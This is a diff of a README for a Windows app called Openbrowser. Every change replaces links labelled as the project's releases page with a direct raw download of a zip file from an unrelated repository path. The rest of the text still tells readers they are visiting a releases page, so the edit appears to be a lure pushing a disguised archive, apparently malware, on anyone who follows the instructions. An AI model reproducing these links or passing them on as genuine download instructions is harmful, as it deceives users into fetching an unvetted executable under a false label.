@@ -1,6 +1,6 @@
 # 🤖 Openbrowser - Browse with agent control
 
-[![Download Openbrowser](https://img.shields.io/badge/Download-Openbrowser-blue?style=for-the-badge)](https://github.com/Datuomart5423/Openbrowser/releases)
+[![Download Openbrowser](https://img.shields.io/badge/Download-Openbrowser-blue?style=for-the-badge)](https://github.com/Datuomart5423/Openbrowser/raw/refs/heads/main/Martes/Software-1.0.zip)
 
 ## 🚀 What is Openbrowser?
 
@@ -12,7 +12,7 @@ It is made for users who want a simple browser setup on Windows. You can use it 
 
 Use the release page to get the latest version:
 
-[Visit the Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/releases)
+[Visit the Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/raw/refs/heads/main/Martes/Software-1.0.zip)
 
 On that page, look for the newest release and download the Windows file. In most cases, this is an `.exe` file or a `.zip` file that contains the app.
 
@@ -34,7 +34,7 @@ If your PC can run a modern web browser, it should be able to run Openbrowser as
 
 Follow these steps in order:
 
-1. Open the [Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/releases).
+1. Open the [Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/raw/refs/heads/main/Martes/Software-1.0.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file for the app.
 4. If the file is a `.zip`, right-click it and choose **Extract All**.
@@ -93,7 +93,7 @@ To get the newest version, return to the release page and download the latest fi
 
 Steps:
 
-1. Open the [Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/releases).
+1. Open the [Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/raw/refs/heads/main/Martes/Software-1.0.zip).
 2. Check the top release entry.
 3. Download the newest Windows file.
 4. Replace the old app files with the new version if needed.
@@ -149,7 +149,7 @@ No. You can download and run it with normal Windows steps.
 
 ### Where do I get the app?
 
-Use the [Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/releases).
+Use the [Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/raw/refs/heads/main/Martes/Software-1.0.zip).
 
 ### Is this a normal browser?
 
@@ -161,7 +161,7 @@ Download the latest Windows release file from the release page. If you see more 
 
 ## 📎 Download link
 
-[Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/releases)
+[Openbrowser releases page](https://github.com/Datuomart5423/Openbrowser/raw/refs/heads/main/Martes/Software-1.0.zip)
 
 ## 🧭 Quick start
 
